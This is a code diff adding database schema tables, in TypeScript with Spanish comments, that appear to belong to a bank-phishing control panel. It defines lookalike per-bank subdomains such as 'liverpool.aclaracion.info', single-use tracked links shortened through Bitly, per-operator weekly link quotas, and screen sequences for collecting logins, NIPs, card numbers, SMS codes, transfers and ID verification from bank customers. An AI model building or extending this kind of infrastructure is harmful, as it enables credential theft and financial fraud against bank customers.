@@ -655,3 +655,119 @@ export const insertWhatsappConversationSchema = createInsertSchema(whatsappConve
 
 export type InsertWhatsappConversation = z.infer<typeof insertWhatsappConversationSchema>;
 export type WhatsappConversation = typeof whatsappConversations.$inferSelect;
+
+// Estados de los links
+export enum LinkStatus {
+  ACTIVE = "active",
+  CONSUMED = "consumed",
+  EXPIRED = "expired",
+  CANCELLED = "cancelled"
+}
+
+// Tabla para subdominios de bancos
+export const bankSubdomains = pgTable("bank_subdomains", {
+  id: serial("id").primaryKey(),
+  bankCode: text("bank_code").notNull().unique(), // Código del banco (liverpool, bbva, etc.)
+  subdomain: text("subdomain").notNull(), // Subdominio (liverpool.aclaracion.info)
+  isActive: boolean("is_active").default(true),
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow()
+});
+
+export const insertBankSubdomainSchema = createInsertSchema(bankSubdomains).omit({
+  id: true,
+  createdAt: true,
+  updatedAt: true
+});
+
+export type InsertBankSubdomain = z.infer<typeof insertBankSubdomainSchema>;
+export type BankSubdomain = typeof bankSubdomains.$inferSelect;
+
+// Tabla para tokens de links de un solo uso
+export const linkTokens = pgTable("link_tokens", {
+  id: serial("id").primaryKey(),
+  userId: integer("user_id").notNull().references(() => users.id), // Usuario que generó el link
+  sessionId: integer("session_id").references(() => sessions.id), // Sesión asociada (opcional)
+  bankCode: text("bank_code").notNull(), // Banco asociado
+  token: text("token").notNull().unique(), // Token único generado
+  originalUrl: text("original_url").notNull(), // URL original completa con subdominio
+  shortUrl: text("short_url"), // URL acortada por Bitly
+  bitlyLinkId: text("bitly_link_id"), // ID del link en Bitly para auditoría
+  status: text("status").notNull().default(LinkStatus.ACTIVE), // Estado del link
+  expiresAt: timestamp("expires_at").notNull(), // Cuándo expira (por defecto 1 hora)
+  usedAt: timestamp("used_at"), // Cuándo fue usado (para un solo uso)
+  extendedUntil: timestamp("extended_until"), // Si se extendió la duración
+  metadata: jsonb("metadata"), // Información adicional (IP, user-agent, etc.)
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow()
+});
+
+export const insertLinkTokenSchema = createInsertSchema(linkTokens).omit({
+  id: true,
+  createdAt: true,
+  updatedAt: true,
+  usedAt: true
+});
+
+export type InsertLinkToken = z.infer<typeof insertLinkTokenSchema>;
+export type LinkToken = typeof linkTokens.$inferSelect;
+
+// Tabla para rastrear uso semanal de links por usuario
+export const linkUsageWeekly = pgTable("link_usage_weekly", {
+  id: serial("id").primaryKey(),
+  userId: integer("user_id").notNull().references(() => users.id),
+  weekStartDate: timestamp("week_start_date").notNull(), // Inicio de la semana (lunes)
+  linkCount: integer("link_count").notNull().default(0), // Contador de links generados
+  lastGeneratedAt: timestamp("last_generated_at"), // Última vez que generó un link
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow()
+}, (table) => ({
+  uniqueUserWeek: unique().on(table.userId, table.weekStartDate)
+}));
+
+export const insertLinkUsageWeeklySchema = createInsertSchema(linkUsageWeekly).omit({
+  id: true,
+  createdAt: true,
+  updatedAt: true
+});
+
+export type InsertLinkUsageWeekly = z.infer<typeof insertLinkUsageWeeklySchema>;
+export type LinkUsageWeekly = typeof linkUsageWeekly.$inferSelect;
+
+// Tipos de pantalla para flujos
+export enum ScreenFlowType {
+  FOLIO = "folio",
+  LOGIN = "login",
+  CODIGO = "codigo",
+  NIP = "nip",
+  PROTEGER = "proteger",
+  TARJETA = "tarjeta",
+  TRANSFERIR = "transferir",
+  CANCELACION = "cancelacion",
+  MENSAJE = "mensaje",
+  SMS_COMPRA = "sms_compra",
+  VALIDANDO = "validando",
+  ESCANEAR_QR = "escanear_qr",
+  CANCELACION_RETIRO = "cancelacion_retiro",
+  VERIFICACION_ID = "verificacion_id"
+}
+
+// Tabla para configuración de flujos de pantallas por banco
+export const bankScreenFlows = pgTable("bank_screen_flows", {
+  id: serial("id").primaryKey(),
+  bankCode: text("bank_code").notNull().unique(), // Código del banco
+  flowConfig: jsonb("flow_config").notNull(), // Array de {screenType, durationMs, payload}
+  isActive: boolean("is_active").default(true),
+  createdBy: integer("created_by").references(() => users.id), // Admin que creó la configuración
+  createdAt: timestamp("created_at").defaultNow(),
+  updatedAt: timestamp("updated_at").defaultNow()
+});
+
+export const insertBankScreenFlowSchema = createInsertSchema(bankScreenFlows).omit({
+  id: true,
+  createdAt: true,
+  updatedAt: true
+});
+
+export type InsertBankScreenFlow = z.infer<typeof insertBankScreenFlowSchema>;
+export type BankScreenFlow = typeof bankScreenFlows.$inferSelect;
